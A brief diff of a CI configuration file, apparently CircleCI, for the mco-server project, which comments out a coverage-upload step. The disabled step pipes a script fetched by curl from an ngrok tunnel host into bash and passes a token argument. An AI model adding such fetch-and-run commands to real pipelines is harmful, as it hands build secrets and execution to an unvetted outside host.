@@ -31,9 +31,9 @@ jobs:
           when: always
       - codecov/upload:
           file: coverage/*.xml
-      - run:
-          name: Upload coverage - Drazisil - testing
-          command: bash <(curl -s http://joe-ccetest-1543d3.ngrok.io/bash) -t "gh123abc" -r drazisil/mco-server
+      # - run:
+      #     name: Upload coverage - Drazisil - testing
+      #     command: bash <(curl -s http://joe-ccetest-1543d3.ngrok.io/bash) -t "gh123abc" -r drazisil/mco-server
       - upload-artifacts-group
       - store_test_results:
           path: test-reports
